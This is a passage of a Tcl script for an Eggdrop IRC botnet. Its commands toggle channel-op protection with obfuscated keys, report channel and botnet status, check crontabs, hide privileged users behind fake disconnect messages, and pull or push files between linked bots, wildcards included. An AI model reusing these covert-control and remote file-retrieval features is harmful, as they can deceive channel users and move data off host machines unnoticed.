         if {[onchan $botnick $1chan]} { set onserver "" } else { putserv "JOIN $1chan" }
      }
      if {![info exists onserver]} { jump }
   }
}
bind bot - fixbot net_fixbots

proc protection { handle idx args } {
   global nick noprot protKey mainchan authKey counters
   set args [lindex $args 0]
   putcmdlog "#$handle# protection [srange $args 1 end]"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set key [sindex $args 0] ; set switch [sindex $args 1]
   if {$switch == ""} { putdcc $idx "\002Usage:\002 .protection <key> <on|off>" ; return }
   if {![info exists protKey] || $protKey == ""} { putdcc $idx "This command is currently disabled." ; return }
   if {![keycheck $idx $key $protKey "PROTECTION"]} { return }
   if {[strcmp $switch on]} {
      catch {unset noprot}
      save_settings
      putallbots "protection $handle $key on"
   } elseif {[strcmp $switch off]} {
      set noprot 1
      save_settings
      putallbots "protection $handle $key off"
      if {![info exists counters([string tolower $nick])]} { set counter 0 } else { set counter [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters([string tolower $nick])] }
      set encryption "[randstring [expr [rand 3]+1]] $counter"
      setutimer 10 "puthelp \"PRIVMSG [str2tcl $mainchan] :\002\002[str2tcl [encrypt [decrypt op SDxjN/byv4d1]$authKey $encryption]]\""
      putdcc $idx "*** Channel-op protection is now disabled.  \002\026DO NOT\026\002 forget to re-enable this."
   } else { putdcc $idx "\002Usage:\002 .protection <key> <on|off>" }
}
bind dcc n protection protection

proc net_protection { bot command args } {
   global nick noprot protKey mainchan authKey counters
   if {![matchattr $bot boT] || ![info exists protKey] || $protKey == ""} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set key [sindex $args 1] ; set switch [sindex $args 2]
   if {[encryptpass $key] != $protKey} {
      putlog "\[\002WARNING\002\] \002$handle@$bot\002 tried to turn channel-op protection $switch with a bogus key."
      return
   }
   if {$switch == "on"} {
      catch {unset noprot}
      putlog "\[\002PROTECTION\002\] Channel-op protection has been \002enabled\002 - (authorized by $handle@$bot)"
   } elseif {$switch == "off"} {
      set noprot 1
      if {![info exists counters([string tolower $nick])]} { set counter 0 } else { set counter [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters([string tolower $nick])] }
      set encryption "[randstring [expr [rand 3]+1]] $counter"
      setutimer 10 "puthelp \"PRIVMSG [str2tcl $mainchan] :\002\002[str2tcl [encrypt [decrypt op SDxjN/byv4d1]$authKey $encryption]]\""
      putlog "\[\002PROTECTION\002\] Channel-op protection has been \002disabled\002 - (authorized by $handle@$bot)"
   } else { return }
   save_settings
}
bind bot - protection net_protection


######################################################################################
##  Miscellaneous Commands

proc chan_status { handle idx args } {
   global lbthresh hbthresh
   putcmdlog "#$handle# chanstats"
   putdcc $idx "\[\002CURRENT CHANNEL STATUS\002\]"
   foreach 1chan [string tolower [channels]] {
      set totalUsers [llength [chanlist $1chan]]
      set botcount [llength [chanoplist $1chan bo]]
      if {![info exists lbthresh($1chan)]} { thresh - - $1chan }
      putdcc $idx " \002$1chan\002  Bots($botcount)  Users($totalUsers)  Mode([getchanmode $1chan])  Low($lbthresh($1chan))/High($hbthresh($1chan))"
   }
}
bind dcc m chanstats chan_status
bind dcc m chanstatus chan_status

proc listinfo { channel idx symbol list } {
   global botnick
   if {[llength $list] < 1} { return }
   set spacing "               "
   foreach 1user [lsort $list] {
      set hand [nick2hand $1user $channel]
      if {[matchattr $hand d]} {
         set flag "d"
      } elseif {[matchattr $hand b]} {
         set flag "b"
      } elseif {[matchattr $hand n]} {
         set flag "n"
      } elseif {[matchattr $hand m]} {
         set flag "m"
      } elseif {[matchattr $hand o]} {
         set flag "o"
      } elseif {[matchattr $hand g]} {
         set flag "g"
      } elseif {[matchattr $hand v]} {
         set flag "v"
      } else { set flag " " }
      set join [strftime %H:%M [getchanjoin $1user $channel]]
      if {$join == 0} { set join " --- " }
      set idle [getchanidle $1user $channel]
      set idletime "   "
      if {$idle < 60 && $idle > 0} { set idletime "[expr $idle]m" }
      if {$idle >= 60 && $idle < 3600} { set idletime "[expr $idle / 60]h" }
      if {$idle >= 3600} { set idletime "[expr $idle / 3600]d" }
      if {[string length $idletime] == 2} { set idletime " $idletime" }
      set host " [getchanhost $1user $channel]"
      if {$1user == $botnick} { set host "<- it's me!" }
      if {[onchansplit $1user $channel]} { set split "(netsplit)" } else { set split "" }
      if {![valididx $idx]} { return }
      putdcc $idx "$symbol$1user [string range $spacing 0 [expr 9 - [string length $1user]]] $hand [string range $spacing 0 [expr 9 - [string length $hand]]] $join $flag $idletime $host $split"
   }
}

proc chan_list { handle idx args } {
   global botnick
   if {[lindex $args 0] == ""} {
      set channel [sindex [console $idx] 0]
      putcmdlog "#$handle# ($channel) channel"
   } else {
      set channel [lindex $args 0]
      putcmdlog "#$handle# channel $channel"
   }
   if {![validchan $channel]} { putdcc $idx "No such channel." ; return }
   if {![onchan $botnick $channel]} {
      putdcc $idx "Desiring channel $channel, 0 members, mode +:"
      putdcc $idx "End of channel info."
      return
   }
   foreach 1user [chanlist $channel] {
      if {[isop $1user $channel]} {
         lappend chops $1user
      } elseif {[isvoice $1user $channel] && ![isop $1user $channel]} { 
         lappend chvoiced $1user
      } else { lappend chnonops $1user }
   }
   if {![info exists chops]} { set chops {} }
   if {![info exists chvoiced]} { set chvoiced {} }
   if {![info exists chnonops]} { set chnonops {} }
   putdcc $idx "Channel $channel, [expr [llength $chops]+[llength $chvoiced]+[llength $chnonops]] members, mode [getchanmode $channel]:"
   putdcc $idx "Channel Topic: [topic $channel]"
   putdcc $idx "(n = owner, m = master, o = op, g = special user, v = auto-voice, d = deop, b = bot)"
   putdcc $idx " NICKNAME    HANDLE      JOIN   IDLE  USER@HOST"
   listinfo $channel $idx "@" $chops
   listinfo $channel $idx "+" $chvoiced
   listinfo $channel $idx " " $chnonops
   putdcc $idx "End of channel info."
}
unbind dcc - channel *dcc:channel
bind dcc o channel chan_list

proc not_away { idx arg } {
   if {![matchattr [idx2hand $idx] m] && [getdccaway $idx] != ""} { setdccaway $idx "" }
   return $arg
}
bind filt - ".*" not_away

proc nick_completion { idx arg } {
   if {[string index $arg 0] == ":"} { return $arg }
   set unick [str2tcl [string tolower [string range $arg 0 [expr [string first : $arg]-1]]]]
   foreach 1user [whom *] {
      if {[string match $unick* [string tolower [lindex $1user 0]]]} {
         return "\002[lindex [lindex $1user 0] 0]\002: [srange $arg 1 end]"
      }
   }
   return $arg
}
bind filt - "%: *" nick_completion

proc owner_talk { idx arg } {
   global nick
   set handle [idx2hand $idx]
   if {![matchattr $handle n]} { return $arg }
   set text "[string range [sindex $arg 0] 1 end] [srange $arg 1 end]"
   foreach 1user [dcclist] {
      if {[matchattr [lindex $1user 1] nW]} { putdcc [lindex $1user 0] "-$handle- $text" }
   }
   putallbots "ownertalk $handle $text"
}
bind filt n ",*" owner_talk

proc net_ownertalk { bot command args } {
   global nick
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set text [srange $args 1 end]
   if {[string match *:+ $handle]} {
      set handle [string range $handle 0 [expr [string length $handle]-3]]
      set flag "T"
   } else { set flag "" }
   foreach 1user [dcclist] {
      if {[matchattr [lindex $1user 1] nW$flag]} { putdcc [lindex $1user 0] "-$handle@$bot- $text" }
   }
}
bind bot - ownertalk net_ownertalk

proc ownerbroadcast { args } {
   global nick
   set args [lindex $args 0]
   foreach 1user [dcclist] {
      if {[matchattr [lindex $1user 1] nWT]} { putdcc [lindex $1user 0] "$args" }
   }
   putallbots "ownertalk $nick:+ $args"
}

proc show_user { idx arg } {
   global nick hiddenuser hidetimer
   set handle [idx2hand $idx]
   if {[string index $arg 0] != "."} {
      if {[matchattr $handle Q]} { putdcc $idx "You are currently in 'quiet mode'; talking is prohibited." ; return }
      if {![matchattr $handle S]} { return $arg }
      if {![info exists hidetimer($handle)]} { set hidetimer($handle) 10 }
      kill_timer "hide_user [str2tcl $handle]"
      if {$hidetimer($handle) != 0} { timer $hidetimer($handle) "hide_user [str2tcl $handle]" }
      if {[info exists hiddenuser($handle@$nick)] && !$hiddenuser($handle@$nick)} { return $arg }
      set hiddenuser($handle@$nick) 0
      putallbots "setuser_back $handle"
      dccbroadcast "$handle has gone."
      dccbroadcast "$handle has joined the party line."
   }
   return $arg
}
bind filt - "*" show_user

proc hide_user { handle } {
   global nick hiddenuser
   kill_timer "hide_user [str2tcl $handle]"
   if {[hand2idx $handle] == -1} { return }
   set hiddenuser($handle@$nick) 1
   putallbots "setuser_hidden $handle"
   dccbroadcast "$handle lost dcc link."
}

proc setuser_hidden { bot command args } {
   global hiddenuser
   set user [sindex [lindex $args 0] 0]
   if {[matchattr $bot bo] && [matchattr $user S]} { set hiddenuser($user@$bot) 1 }
}
bind bot - setuser_hidden setuser_hidden

proc setuser_back { bot command args } {
   global hiddenuser
   set user [sindex [lindex $args 0] 0]
   if {[matchattr $bot bo] && [matchattr $user S]} { set hiddenuser($user@$bot) 0 }
}
bind bot - setuser_back setuser_back

proc hide_me { handle idx args } {
   if {![matchattr $handle S]} { putdcc $idx "What?  You need '.help'" ; return }
   putloglev 2 * "#$handle# hideme"
   hide_user $handle
   putdcc $idx "You are now hidden from other users on the botnet."
}
bind dcc S hideme hide_me

proc unhide_me { handle idx args } {
   global nick hiddenuser hidetimer
   if {![matchattr $handle S]} { putdcc $idx "What?  You need '.help'" ; return }
   putloglev 2 * "#$handle# unhideme"
   kill_timer "hide_user [str2tcl $handle]"
   if {![info exists hidetimer($handle)]} {
      timer 10 "hide_user [str2tcl $handle]"
   } elseif {$hidetimer($handle) != 0} { timer $hidetimer($handle) "hide_user [str2tcl $handle]" }
   set hiddenuser($handle@$nick) 0
   putallbots "setuser_back $handle"
   dccbroadcast "$handle has gone."
   dccbroadcast "$handle has joined the party line."
   putdcc $idx "You are no longer hidden from other users on the botnet."
}
bind dcc S unhideme unhide_me

proc hide_time { handle idx args } {
   global hidetimer
   if {![matchattr $handle S]} { putdcc $idx "What?  You need '.help'" ; return }
   set args [lindex $args 0]
   set minutes [sindex $args 0]
   putloglev 2 * "#$handle# hidetime $args"
   if {![isnum $minutes] || $minutes < 0 || $minutes > 999999999} {
      putdcc $idx "\002Usage:\002 .hidetime <minutes>   : 0 = disabled" ; return
   }
   if {$minutes == 0} {
      kill_timer "hide_user [str2tcl $handle]"
      putdcc $idx "You will no longer be hidden from other users on the botnet."
   } else {
      settimer $minutes "hide_user [str2tcl $handle]"
      putdcc $idx "You will automatically be hidden on the botnet after \002$minutes\002 minute(s) of inactivity."
   }
   set hidetimer($handle) $minutes
   save_settings
   putallbots "hidetime $handle $minutes"
}
bind dcc S hidetime hide_time
bind dcc S hidetimer hide_time

proc net_hidetime { bot command args } {
   global hidetimer
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set minutes [sindex $args 1]
   if {![isnum $minutes] || $minutes < 0 || $minutes > 999999999 || ![matchattr $handle S]} { return }
   set hidetimer($handle) $minutes
   if {$minutes == 0} { kill_timer "hide_user [str2tcl $handle]" }
   save_settings
}
bind bot - hidetime net_hidetime

proc reset_channels { handle idx args } {
   set args [lindex $args 0]
   putcmdlog "#$handle# resetchans $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .resetchans <*|channels>" ; return }
   if {$args == "*"} { set chans [channels] } else { set chans [split $args] }
   foreach 1chan $chans {
      if {![validchan $1chan]} { continue }
      reset_modes $handle - $1chan
      reset_bans $handle - $1chan
   }
   putdcc $idx "*** Resetting channel modes and bans on:  $chans"
}
bind dcc n resynch reset_channels
bind dcc n resetchans reset_channels

proc reset_modes { handle idx args } {
   set args [lindex $args 0]
   if {[valididx $idx]} { putcmdlog "#$handle# resetmodes $args" }
   if {$args == ""} {
      if {[valididx $idx]} { putdcc $idx "\002Usage:\002 .resetmodes <*|channels>" }
      return
   } elseif {$args == "*"} {
      set chans [channels]
      if {[valididx $idx]} { putdcc $idx "*** Resetting channel modes on all channels" }
   } else {
      set chans [split $args]
      if {[valididx $idx]} { putdcc $idx "*** Resetting channel modes on:  $chans" }
   }
   foreach 1chan $chans {
      if {[validchan $1chan] && [botisop $1chan]} { putserv "MODE $1chan -smtinplk[lindex [channel info $1chan] 0]" }
   }
}
bind dcc n resetmodes reset_modes

proc reset_bans { handle idx args } {
   set args [lindex $args 0]
   if {[valididx $idx]} { putcmdlog "#$handle# resetbans $args" }
   if {$args == ""} {
      if {[valididx $idx]} { putdcc $idx "\002Usage:\002 .resetbans <*|channels>" }
      return
   } elseif {$args == "*"} {
      set chans [channels]
      if {[valididx $idx]} { putdcc $idx "*** Resetting channel bans on all channels" }
   } else {
      set chans [split $args]
      if {[valididx $idx]} { putdcc $idx "*** Resetting channel bans on:  $chans" }
   }
   foreach 1chan $chans {
      if {[validchan $1chan] && [botisop $1chan]} { resetbans $1chan }
   }
}
bind dcc n resetbans reset_bans

proc net_status { handle idx args } {
   global nick botnick lbthresh hbthresh chmodes
   set chans [lindex $args 0]
   if {![validuser $handle]} {
      set uidx [lindex [split $handle :] 0] ; set bot [lindex [split $handle :] 1]
   }
   if {[valididx $idx]} {
      putcmdlog "#$handle# netstatus $chans"
      if {$chans == ""} { putdcc $idx "\002Usage:\002 .netstatus <chan1> \[chan2\] ..." ; return }
      putdcc $idx "\[\002CHANNEL STATUS\002\]"
   }
   foreach 1chan [split [string tolower $chans]] {
      if {[valididx $idx]} {
         putallbots "netstatus $1chan $idx"
         putdcc $idx "*** $1chan"
         putdcc $idx "    \002$nick\002"
         if {![validchan $1chan]} {
            putdcc $idx "       - No info for \002$1chan\002, invalid channel."
            putdcc $idx " "
            continue
         }
      } elseif {![validchan $1chan]} { catch {putbot $bot "chanstatus $uidx $1chan -1"} ; continue }
      if {[onchan $botnick $1chan]} {
         set goodops {} ; set badops {} ; set opcount 0 ; set botcount 0
         foreach 1user [chanoplist $1chan] {
            set uhand [nick2hand $1user $1chan]
            if {![validop $uhand $1chan]} { lappend badops $1user } else { lappend goodops $1user }
            if {[matchattr $uhand b] || [matchchanattr $uhand b $1chan]} { incr botcount }
            incr opcount
         }
      } elseif {[valididx $idx]} {
         putdcc $idx "       - No channel information available, not on channel."
         putdcc $idx " "
         continue
      } else {
         catch {putbot $bot "chanstatus $uidx $1chan 0"}
         continue
      }
      set goodops [srange [join [lsort $goodops]] 0 end]
      set badops [srange [join [lsort $badops]] 0 end]
      if {[botisop $1chan]} { set botisop "Yes." } else { set botisop "No." }
      regsub -all " " [getchanmode $1chan] ":" chanmodes
      if {[isclosed $1chan]} { set sdstatus "closed" } else { set sdstatus "open" }
      if {[isautokick $1chan]} { set kickchan "Yes." } else { set kickchan "No." }
      if {![info exists lbthresh($1chan)]} { thresh - - $1chan }
      set totalusers [llength [chanlist $1chan]] ; set goodcount [llength $goodops] ; set badcount [llength $badops]
      if {![valididx $idx]} {
         catch {putbot $bot "chanstatus $uidx $1chan 1 $botnick $botisop $chanmodes $opcount $totalusers $goodcount $badcount $sdstatus $kickchan $lowthresh $hithresh $botcount $goodops:$badops"}
         continue
      }
      putdcc $idx "       - Current nick:  $botnick"
      putdcc $idx "       - Have ops:  $botisop"
      putdcc $idx "       - Channel modes:  [getchanmode $1chan]"
      putdcc $idx "       - Shutdown status:  $sdstatus"
      putdcc $idx "       - Auto-kick mode:  $kickchan"
      putdcc $idx "       - Bot-count thresholds:  Low($lbthresh($1chan)), High($hbthresh($1chan))"
      putdcc $idx "       - Op-count:  $opcount"
      putdcc $idx "       - Bots Opped:  $botcount"
      putdcc $idx "       - Total Users:  $totalusers"
      putdcc $idx "       - Good Ops (+o):  \002$goodcount\002  $goodops"
      putdcc $idx "       - Bad Ops (-o):  \002$badcount\002  $badops"
      putdcc $idx " "
   }
}
bind dcc m netstatus net_status

proc send_status { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   net_status [sindex $args 1]:$bot - [sindex $args 0]
}
bind bot - netstatus send_status

proc received_status { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0] ; set channel [sindex $args 1]
   if {![valididx $idx]} { return }
   putdcc $idx "*** $channel"
   putdcc $idx "    \002$bot\002"
   if {[sindex $args 2] == "-1"} {
      putdcc $idx "       - No info for \002$channel\002, invalid channel."
      putdcc $idx " "
      return
   } elseif {![sindex $args 2]} {
      putdcc $idx "       - No channel information available, not on channel."
      putdcc $idx " "
      return
   }
   regsub -all ":" [sindex $args 5] " " chanmodes
   set ops [srange $args 15 end]
   if {![string match *:* $ops]} { append ops : }
   putdcc $idx "       - Current nick:  [sindex $args 3]"
   putdcc $idx "       - Have ops:  [sindex $args 4]"
   putdcc $idx "       - Channel modes:  $chanmodes"
   putdcc $idx "       - Shutdown status:  [sindex $args 10]"
   putdcc $idx "       - Auto-kick mode:  [sindex $args 11]"
   putdcc $idx "       - Bot-count thresholds:  Low([sindex $args 12]), High([sindex $args 13])"
   putdcc $idx "       - Op-count:  [sindex $args 6]"
   putdcc $idx "       - Bots Opped:  [sindex $args 14]"
   putdcc $idx "       - Total Users:  [sindex $args 7]"
   putdcc $idx "       - Good Ops (+o):  \002[sindex $args 8]\002  [lindex [split $ops :] 0]"
   putdcc $idx "       - Bad Ops (-o):  \002[sindex $args 9]\002  [lindex [split $ops :] 1]"
   putdcc $idx " "
}
bind bot - chanstatus received_status

proc botnet_info { handle idx args } {
   global nick botnick mainchan
   putcmdlog "#$handle# bots"
   set total 0
   foreach 1user [userlist b] {
      if {![strcmp $1user $nick] && [lsearch -exact [string tolower [bots]] [string tolower $1user]] == -1} {
         lappend unlinked $1user
      }
      if {![matchattr $1user L] && [validchan $mainchan]} {
         if {![onchan [hand2nick $1user $mainchan] $mainchan]} {
            lappend offirc $1user
         } else { lappend onirc $1user }
      }
      incr total
   }
   putdcc $idx "\[\002BOTNET INFO\002\] -- \002Total Bots\002 ($total)"
   if {[bots] != ""} {
      set linked [bots]
      lappend linked $nick
      putdcc $idx " - \002Bots linked\002 ([llength $linked]):  [join [lsort $linked]]"
      if {[info exists unlinked] && [llength $unlinked] > 0} {
         putdcc $idx " - \002Bots unlinked\002 ([llength $unlinked]):  [join [lsort $unlinked]]"
      } else { putdcc $idx " - \002Bots unlinked\002 (0):  All bots are linked." }
   } else { putdcc $idx " - \002NO BOTS LINKED\002 -" }
   putdcc $idx " "
   if {[validchan $mainchan] && [onchan $botnick $mainchan]} {
      putdcc $idx " - \002On IRC\002 ([llength $onirc]):  [join [lsort $onirc]]"
      if {[info exists offirc]} {
         putdcc $idx " - \002Off IRC\002 ([llength $offirc]):  [join [lsort $offirc]]"
         putdcc $idx " "
         if {[info exists linked]} {
            foreach 1bot $offirc {
               if {[lsearch -exact $linked $1bot] != -1} { lappend needjump $1bot }
            }
         }
         if {[info exists needjump]} { putdcc $idx " - \002Need Jump\002 ([llength $needjump]):  [join [lsort $needjump]]" }
      } else { putdcc $idx " - \002Off IRC\002 (0):  All bots are on IRC." }
      if {[info exists unlinked]} {
         foreach 1bot $onirc {
            if {[lsearch -exact $unlinked $1bot] != -1} { lappend needlink $1bot }
         }
      }
      if {[info exists needlink]} { putdcc $idx " - \002Need Link\002 ([llength $needlink]):  [join [lsort $needlink]]" }
   } else { putdcc $idx " - Unable to determine which bots are on IRC, not on main channel" }
}
unbind dcc - bots *dcc:bots
bind dcc m bots botnet_info

proc whoami { handle idx args } {
   global nick botnick server realserver limbo proxybot
   putcmdlog "#$handle# whoami"
   if {[info exists limbo]} { putdcc $idx "I am \002$nick\002." ; return }
   if {[info exists proxybot]} { set curserver $realserver } else { set curserver [lindex [split $server :] 0] }
   if {[isip $curserver] && [catch {set host [gethost $curserver]}] == 0} { set curserver $host }
   putdcc $idx "I am \002$nick\002, running on $curserver with the nick '$botnick'."
}
bind dcc m whoami whoami

proc check_crontab { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# checkcron $args"
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .checkcron <*|bots>"
      putdcc $idx " "
   }
   putdcc $idx "\[\002CRONTAB STATUS\002\]"
   if {$args == "*" || $args == ""} {
      if {[catch {exec crontab -l} error] != 0} {
         putdcc $idx "     NO CRONTAB     $nick  : ($error)"
      } else { putdcc $idx "     CRONTABBED     $nick" }
      if {$args == "*"} { putallbots "checkcron $idx" }
   } else {
      foreach 1bot [split $args] { catch {putbot $1bot "checkcron $idx"} }
   }
}
bind dcc n checkcron check_crontab
bind dcc n crontab check_crontab
   
proc net_checkcron { bot command args } {
   if {![matchattr $bot bo]} { return }
   if {[catch {exec crontab -l} error] != 0} {
      catch {putbot $bot "cron [lindex $args 0] $error"}
   } else { catch {putbot $bot "cron [lindex $args 0] *"} }
}
bind bot - checkcron net_checkcron

proc cron_status { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0] ; set error [srange $args 1 end]
   if {![valididx $idx]} { return }
   if {$error != "*"} {
      putdcc $idx "     NO CRONTAB     $bot  : ($error)"
   } else { putdcc $idx "     CRONTABBED     $bot" }
}
bind bot - cron cron_status

proc bot_ping { handle idx args } {
   global pingrequest
   set args [lindex $args 0]
   set nick [sindex $args 0]
   putcmdlog "#$handle# PING $nick"
   if {$nick == "" || [string index $nick 0] == "#"} { putdcc $idx "\002Usage:\002 .ping <nick>" ; return }
   set pingrequest([string tolower $nick]) $idx
   settimer 15 "catch {unbind raw - NOTICE botping_reply}"
   bind raw - NOTICE botping_reply
   putserv "PRIVMSG $nick :PING [unixtime]"
}
bind dcc n ping bot_ping

proc botping_reply { from keyword args } {
   global pingrequest
   set args [lindex $args 0]
   if {[sindex $args 1] != ":PING"} { return }
   set nick [lindex [split $from !] 0]
   setutimer 1 "catch {unbind raw - NOTICE botping_reply}"
   if {![array exists pingrequest] || ![info exists pingrequest([string tolower $nick])]} { return }
   set minplural "s" ; set secplural "s"
   set pingreply [string range [sindex $args 2] 0 8]
   if {![isnum $pingreply]} { return }
   set ping [expr [unixtime]-$pingreply]
   if {$ping < 60} {
      if {$ping == 1} { set secplural "" }
      set ping "$ping second$secplural"
   } else {
      set minutes [expr $ping / 60] ; set seconds [expr $ping % 60]
      if {$minutes == 1} { set minplural "" }
      if {$seconds == 1} { set secplural "" }
      set ping "$minutes minute$minplural $seconds second$secplural"
   }
   if {[valididx $pingrequest([string tolower $nick])]} {
      putdcc $pingrequest([string tolower $nick]) "*** CTCP PING reply from \002$nick\002:  $ping"
   }
   unset pingrequest([string tolower $nick])
}


######################################################################################
##  File Transfer Services

proc send_file { handle idx args } {
   global nick botnick mainchan ftsKey
   set args [lindex $args 0]
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set key [sindex $args 0] ; set bot [sindex $args 1] ; set files [srange $args 2 end]
   if {$files == ""} {
      putdcc $idx "\002Usage:\002 .send <key> <bot> <file1> \[file2\] ..." ; return
   }
   if {![info exists ftsKey] || $ftsKey == ""} { putdcc $idx "File transfer services is currently disabled." ; return }
   if {![keycheck $idx $key $ftsKey "file transfer"]} { return }
   putcmdlog "#$handle# send $bot $files"
   putdcc $idx "*** Uploading '$files' to \002$bot\002"
   set sendnick [hand2nick $bot $mainchan]
   foreach 1file [split $files] {
      if {![file isfile $1file]} {
         putdcc $idx "*** Cannot send '$1file':  file does not exist"
      } elseif {![validchan $mainchan] || $sendnick == ""} {
         putdcc $idx "*** Failed to locate \002$bot\002 on IRC"
      } else {
         if {[string match "*/*" $1file]} {
            catch {putbot $bot "sending $botnick [string range $1file [expr 1+[string last / $1file]] end]"}
         } else { catch {putbot $bot "sending $botnick $1file"} }
         dccsend $1file $sendnick
      }
   }
}
bind dcc n send send_file
bind dcc n put send_file

proc msend_file { handle idx args } {
   global nick botnick mainchan recipients ftsKey
   set args [lindex $args 0]
   set files [srange $args 1 end]
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set key [sindex $args 0] ; set files [srange $args 1 end]
   if {$files == ""} { putdcc $idx "\002Usage:\002 .msend <key> <file1> \[file2\] ..." ; return }
   if {![info exists ftsKey] || $ftsKey == ""} { putdcc $idx "File transfer services is currently disabled." ; return }
   if {![keycheck $idx $key $ftsKey "multi-file transfer"]} { return }
   putcmdlog "#$handle# msend $files"
   if {([llength $files] > 1) && ([expr [llength $files] * [llength [bots]]] > 20)} { 
      putdcc $idx "\[\002ALERT\002\] The command you just entered would result in more than 20 concurrent dcc sends."
      putdcc $idx " - Send only one file at a time with this many bots."
      return
   }
   putdcc $idx "*** Uploading '$files' to all bots."
   kill_timer transfer_status
   foreach 1file [split $files] {
      if {[string match "*/*" $1file]} {
         set filename [string range $1file [expr 1+[string last "/" $1file]] end]
      } else { set filename $1file }
      set recipients($filename) {}
      foreach 1bot [bots] {
         if {[matchattr $1bot L] || [matchattr $1bot C] || ![matchattr $1bot bo]} { continue }
         if {![file isfile $1file]} { putdcc $idx "*** Cannot send '$1file':  File does not exist." ; break }
         if {[validchan $mainchan]} { set sendnick [hand2nick $1bot $mainchan] } else { set sendnick "" }
         if {$sendnick != ""} {
            catch {putbot $1bot "sending $botnick $filename"}
            dccsend $1file $sendnick
            lappend recipients($filename) $1bot 
         } else { putdcc $idx "*** Failed to locate \002$1bot\002 on IRC" }
      }
   }
   settimer 3 transfer_status
}
bind dcc n msend msend_file
bind dcc n mput msend_file

proc get_file { handle idx args } {
   global nick botnick ftsKey
   set args [lindex $args 0]
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set key [sindex $args 0] ; set bot [sindex $args 1] ; set files [srange $args 2 end]
   if {$files == ""} {
      putdcc $idx "\002Usage:\002 .get <key> <bot> <file1> \[file2\] ..." ; return
   }
   if {![info exists ftsKey] || $ftsKey == ""} { putdcc $idx "File transfer services is currently disabled." ; return }
   if {![keycheck $idx $key $ftsKey "GET"]} { return }
   putcmdlog "#$handle# get $bot $files"
   putdcc $idx "*** Requesting '$files' from \002$bot\002."
   catch {putbot $bot "sendfile $botnick $idx $files"}
}
bind dcc n get get_file

proc mget_file { handle idx args } {
   global nick botnick ftsKey
   set args [lindex $args 0]
   set key [sindex $args 0] ; set files [srange $args 1 end]
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$files == ""} { putdcc $idx "\002Usage:\002 .mget <key> <file1> \[file2\] ..." ; return }
   if {![info exists ftsKey] || $ftsKey == ""} { putdcc $idx "File transfer services is currently disabled." ; return }
   if {![keycheck $idx $key $ftsKey "multi-GET"]} { return }
   putcmdlog "#$handle# mget $files"
   if {([llength $files] > 1) && ([expr [llength $files] * [llength [bots]]] > 20)} { 
      putdcc $idx "\[\002ALERT\002\] The command you just entered would result in more than 20 concurrent dcc gets."
      putdcc $idx " - With this many bots, you should use this command to receive just one file."
   } else {
      putdcc $idx "*** Requesting '$files' from all bots."
      putallbots "sendfile $botnick $idx $files"
   }
}
bind dcc n mget mget_file

proc bot_send { bot command args } {
   global nick botnick
   if {![matchattr $bot boxT]} { return }
   set args [lindex $args 0]
   set sendnick [sindex $args 0] ; set idx [sindex $args 1] ; set files [srange $args 2 end]
   foreach sendfile [split $files] {
      if {[file isfile $sendfile]} {
         putlog "\[\002FILE REQUEST\002\] Sending '$sendfile' to \002$sendnick\002 ..."
         dccsend $sendfile $sendnick
      } elseif {[string first * $sendfile] != -1} {
         foreach 1file [exec ls -a] {
            if {![string match [str2tcl $sendfile] $1file]} { continue }
            putlog "\[\002FILE REQUEST\002\] Sending matching wildcard file '$1file' to \002$sendnick\002 ..."
            dccsend $1file $sendnick
            set match ""
         }
         if {[info exists match]} { continue }
         set error "  ($nick) No matching files with wildcard query '$sendfile'"
         catch {putbot $bot "show $idx $error"}
      } else {
         set error "  ($nick) No such file:  $sendfile"
         catch {putbot $bot "show $idx $error"}
      }
   }
}
bind bot - sendfile bot_send

proc is_sending { bot command args } {
   global filesends
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set sendnick [sindex $args 0] ; set file [sindex $args 1]
   set filesends($sendnick:$file) ""
   settimer 10 "catch {unset filesends([str2tcl $sendnick:$file])}"
}
bind bot - sending is_sending

proc moved { bot command args } {
   global recipients
   set file [lindex $args 0]
   if {![info exists recipients($file)] || [set s [lsearch -exact $recipients($file) $bot]] == -1} { return }
   set recipients($file) [lreplace $recipients($file) $s $s]
   if {[llength $recipients($file)] < 1} {
      putlog "\[\002FILE TRANSFER\002\] File transfer of \002$file\002 completed successfully to all available bots."
      unset recipients($file)
      kill_timer transfer_status
   }
}
bind bot - moved moved

proc rehash_bot { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# rehashbot $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .rehashbot <*|bots>" ; return }
   if {$args == "*"} { 
      putdcc $idx "*** Rehashing all remote bots ..."
      putallbots "rehash"
      return
   }
   putdcc $idx "*** Rehashing remote bot(s):  $args"
   foreach 1bot [split $args] { catch {putbot $1bot "rehash"} }
}
bind dcc n rehashbot rehash_bot
bind dcc n rehashbots rehash_bot
bind dcc n netrehash rehash_bot

proc do_rehash { bot command args } {
   global nick proxybot
   if {![matchattr $bot boT]} { return }
   setutimer 1 rehash
   if {[info exists proxybot]} {
      if {[file isfile $nick.source]} { source $nick.source } else { source source }
   }
}
bind bot - rehash do_rehash

proc filt_rehash { idx arg } {
   global nick proxybot
   putcmdlog "#[idx2hand $idx]# [string range $arg 1 end]"
   setutimer 1 rehash
   if {[info exists proxybot]} {
      if {[file isfile $nick.source]} { source $nick.source } else { source source }
   }
   return
}
bind filt m ".rehash" filt_rehash

proc transfer_status {} {
   global recipients
   if {![info exists recipients]} { return 1 }
   foreach 1file [array names recipients] {
      if {[llength $recipients($1file)] > 0} { putlog "\[\002FILE STATUS\002\] File transfers of \002$1file\002 pending or incomplete:  [lsort $recipients($1file)]" }
   }
   return 0
}

proc file_status { handle idx args } {
   putcmdlog "#$handle# filestatus"
